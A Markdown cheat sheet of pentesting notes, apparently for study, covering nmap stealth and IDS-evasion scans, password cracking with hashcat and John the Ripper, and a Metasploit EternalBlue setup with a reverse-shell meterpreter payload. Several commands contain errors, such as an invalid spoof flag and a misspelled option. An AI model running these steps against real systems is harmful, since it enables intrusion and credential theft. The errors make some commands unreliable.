# Ethical Considerations
Remember that hacking into devices without permission is illegal and unethical.\
Always ensure you have the necessary permissions and are conducting these activities in a\
controlled environment for educational or security assessment purposes.

# Tools

<details>
<summary style="cursor:pointer">nmap</summary>
  
Read more [CheatSheet](./nmap-cheat-sheet.pdf)\
  
Tabelle\
Scan Type	Speed	Stealth	Accuracy	Firewall Evasive\
SYN Scan	Fast	Medium	High	Medium\
NULL Scan	Slow	Very High	Medium	High\
FIN Scan	Slow	High	Medium	Medium\
Xmas Scan	Slow	Medium	Medium	Medium\
ACK Scan	Very Slow	Low	High	Low

SYN Scan (Standard Scan)
```
sudo nmap -sS 192.168.50.5
```
Null-Sacn (Very stealthy)
```
sudo nmap -sN 192.168.50.5
```
IP-Spoofing (extra Layer STH
```
IP spoofing alters the source IP in scanned packets to obfuscate your scanning host. While not spoofing itself, it adds an extra layer of stealth:
This makes your scans appear to originate from the bogus source IP rather than your true scanning system.

nmap --spoof-source 192.168.1.5 192.168.1.25
```
Fragmented Packets
```bash
Fragmenting the scanned packets breaks them into multiple pieces to avoid triggering IDS signatures tuned to whole packets.

nmap --mtu 24 192.168.1.25
```

</details>

<details>
<summary style="cursor:pointer">hashcat</summary>
  
Read more [List-HashCat](https://hashcat.net/wiki/doku.php?id=example_hashes)
  
Common Hashes: Base64 , SHA256 , MD4 , MD5, bcyrpt, acrypt, etc - see list

Use hascat or JohnTheRipper
```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

</details>

<details>
<summary style="cursor:pointer">john the ripper</summary>
Read more [List-Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
  
Common Hashes: Base64 , SHA256 , MD4 , MD5, bcyrpt, acrypt, etc - see list

Identify Hash Format with HashID -Tool
```
hashid 7bf6d9bb82bed1302f331fc6b816aada
```

Dictonary BruteForce
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Single Word BruteForce
```
IMPORTANT: in the text.file [joker:HASHVALUE ................]
Example: joker:r0mwmrt9mewvm9ze00mtmrewm9ewrmz0wemzbmwermzewr

john --single --format=raw-MD5 --worlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

Zip and Rar convert to John Hashable file
```
zip2john filezip.zip > hashfile
or
python3 rar2john filerar.rar > hashfile

does a secured rar file >> into a hashfile

use: "zip2john --wordlist=/usr/share/wordlist/rockyou.txt hashfile"
or the python3 python3 rar2john
```


</details>


<details>
<summary style="cursor:pointer">metasploit</summary>

RHOST = Remote Host\
RPORT = Remote Port

```
msfconsole
msf6 >
```

``` 
CCHOOSE EXPLOIT - Example eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue

changes to \/\/
msf6 exploit(windows/smb/ms17_010_eternalblue) > 

```

```
SHOW OPTIONS
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):
   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using
                                             -metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only
                                             affects Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affe
                                             cts Windows Server 2008 R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.67.91.215     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

---
This will print options related to the exploit we have chosen earlier.\
The show options command will have different outputs depending on the context it is used in. \
The example above shows that this exploit will require we set variables like RHOSTS and RPORT.\
On the other hand, a post-exploitation module may only need us to set a SESSION ID (see the screenshot below).\
A session is an existing connection to the target system that the post-exploitation module will use.\

No RHOST or RPORT needed just >>> SessionID

```
msf6 post(windows/gather/enum_domain_users) > show options

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on.
   USER                      no        Target User for NetSessionEnum

msf6 post(windows/gather/enum_domain_users) >
```

For more details and infos use "info"
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
```

Here you can see the exploit ranking: [Ranks](./metasploitrank.png)

</details>

<details>
<summary style="cursor:pointer">dirbuster</summary>
  

</details>

<details>
<summary style="cursor:pointer">gobuster</summary>
  

</details>
